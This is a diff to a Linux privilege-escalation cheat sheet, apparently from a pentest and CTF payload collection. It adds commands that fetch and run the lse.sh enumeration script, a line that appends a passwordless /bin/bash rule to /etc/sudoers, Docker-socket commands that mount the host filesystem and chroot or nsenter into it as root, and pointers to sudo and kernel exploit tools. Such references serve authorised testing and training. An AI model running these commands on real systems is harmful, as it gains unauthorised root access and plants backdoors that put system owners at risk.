@@ -2,13 +2,25 @@
 
 ## Tools
 
+- [LinuxSmartEnumeration - Linux enumeration tools for pentesting and CTFs](https://github.com/diego-treitos/linux-smart-enumeration)
+
+    ```powershell
+    wget "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -O lse.sh
+    curl "https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh" -o lse.sh
+    ./lse.sh -l1 # shows interesting information that should help you to privesc
+    ./lse.sh -l2 # dump all the information it gathers about the system
+    ```
+
 - [LinEnum - Scripted Local Linux Enumeration & Privilege Escalation Checks](https://github.com/rebootuser/LinEnum)
+    
     ```powershell
     ./LinEnum.sh -s -k keyword -r report -e /tmp/ -t
     ```
+
 - [BeRoot - Privilege Escalation Project - Windows / Linux / Mac](https://github.com/AlessandroZ/BeRoot)
 - [linuxprivchecker.py - a Linux Privilege Escalation Check Script](https://github.com/sleventyeleven/linuxprivchecker)
 - [unix-privesc-check - Automatically exported from code.google.com/p/unix-privesc-check](https://github.com/pentestmonkey/unix-privesc-check)
+- [Privilege Escalation through sudo - Linux](https://github.com/TH3xACE/SUDO_KILLER)
 
 ## Summary
 
@@ -72,7 +84,7 @@
   * Checks if password hashes are stored in /etc/passwd
   * Extract full details for 'default' uid's such as 0, 1000, 1001 etc
   * Attempt to read restricted files i.e. /etc/shadow
-  * List current users history files (i.e .bash_history, .nano_history etc.)
+  * List current users history files (i.e .bash_history, .nano_history, .mysql_history , etc.)
   * Basic SSH checks
 * Privileged access:
   * Which users have recently used sudo
@@ -202,6 +214,14 @@ cat /etc/cron.allow
 cat /etc/cron.deny*
 ```
 
+You can use [pspy](https://github.com/DominicBreuker/pspy) to detect a CRON job.
+
+```powershell
+# print both commands and file system events and scan procfs every 1000 ms (=1sec)
+./pspy64 -pf -i 1000 
+```
+
+
 ## Systemd timers
 
 ```powershell
@@ -290,6 +310,7 @@ uid=0(root) gid=1000(swissky)
 ```
 
 ## SUDO
+Tool: [Sudo Exploitation](https://github.com/TH3xACE/SUDO_KILLER)
 
 ### NOPASSWD
 
@@ -434,8 +455,8 @@ echo "username ALL=(ALL:ALL) ALL">>/etc/sudoers
 
 # use SUDO without password
 echo "username ALL=(ALL) NOPASSWD: ALL" >>/etc/sudoers
+echo "username ALL=NOPASSWD: /bin/bash" >>/etc/sudoers
 ```
-
 
 ## NFS Root Squashing
 
@@ -553,6 +574,13 @@ sh-5.0# id
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
+More docker privilege escalation using the Docker Socket.
+
+```powershell
+sudo docker -H unix:///google/host/var/run/docker.sock run -v /:/host -it ubuntu chroot /host /bin/bash
+sudo docker -H unix:///google/host/var/run/docker.sock run -it --privileged --pid=host debian nsenter -t 1 -m -u -n -i sh
+```
+
 ### LXC/LXD
 
 The privesc requires to run a container with elevated privileges and mount the host filesystem inside.
@@ -592,7 +620,7 @@ Precompiled exploits can be found inside these repositories, run them at your ow
 * [bin-sploits - @offensive-security](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits)
 * [kernel-exploits - @lucyoa](https://github.com/lucyoa/kernel-exploits/)
 
-The following exploits are known to work well.
+The following exploits are known to work well, search for another exploits using `searchsploit -w linux kernel centos`.
 
 ### CVE-2016-5195 (DirtyCow)
 
